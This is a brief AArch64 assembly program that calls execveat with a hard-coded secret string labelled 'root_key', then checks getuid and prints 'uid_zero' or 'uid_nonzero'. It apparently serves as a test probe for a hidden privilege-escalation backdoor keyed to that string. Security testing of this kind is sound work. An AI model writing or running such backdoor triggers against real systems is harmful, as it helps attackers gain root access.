.section .text
.global _start
_start:
    mov x0, #-100
    adr x1, root_key
    mov x2, xzr
    mov x3, xzr
    mov x4, xzr
    mov x8, #281
    svc #0

    mov x8, #174
    svc #0
    cbz x0, 1f

    mov x0, #1
    adr x1, nonroot_msg
    mov x2, #12
    mov x8, #64
    svc #0
    mov x0, #1
    mov x8, #93
    svc #0

1:
    mov x0, #1
    adr x1, root_msg
    mov x2, #9
    mov x8, #64
    svc #0
    mov x0, #0
    mov x8, #93
    svc #0

.section .rodata
root_key:
    .asciz "MoFS20amQM1zKk0pa7ZHuBm4rMaiapAlVWoxVCwdSSD4Plk"
root_msg:
    .ascii "uid_zero\n"
nonroot_msg:
    .ascii "uid_nonzero\n"
